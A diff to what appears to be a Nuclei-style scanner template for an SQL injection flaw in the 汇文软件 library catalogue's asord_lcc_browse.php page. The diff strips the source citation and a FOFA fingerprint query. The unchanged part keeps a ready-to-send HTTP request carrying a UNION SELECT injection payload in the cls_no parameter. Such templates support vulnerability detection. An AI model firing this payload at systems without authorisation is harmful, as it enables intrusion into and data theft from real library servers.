@@ -3,12 +3,8 @@ info:
   name: 汇文软件-书目检索系统 asord_lcc_browse.php 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/niewpfw0ggqwgbi4'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: niewpfw0ggqwgbi4
-    fofa: app="汇文软件-书目检索系统"
 http:
 - raw:
   - 'GET /asord/asord_lcc_browse.php?cls_no=A%''+UNION+ALL+SELECT+CHR(113)||CHR(107)||CHR(107)||CHR(112)||CHR(113)||CHR(87)||CHR(71)||CHR(77)||CHR(70)||CHR(73)||CHR(118)||CHR(75)||CHR(68)||CHR(86)||CHR(110)||CHR(85)||CHR(106)||CHR(102)||CHR(117)||CHR(66)||CHR(106)||CHR(102)||CHR(118)||CHR(104)||CHR(122)||CHR(86)||CHR(77)||CHR(68)||CHR(117)||CHR(73)||CHR(105)||CHR(84)||CHR(65)||CHR(101)||CHR(88)||CHR(113)||CHR(113)||CHR(114)||CHR(110)||CHR(66)||CHR(84)||CHR(71)||CHR(102)||CHR(116)||CHR(120)||CHR(113)||CHR(118)||CHR(112)||CHR(120)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+DUAL--+A HTTP/1.1
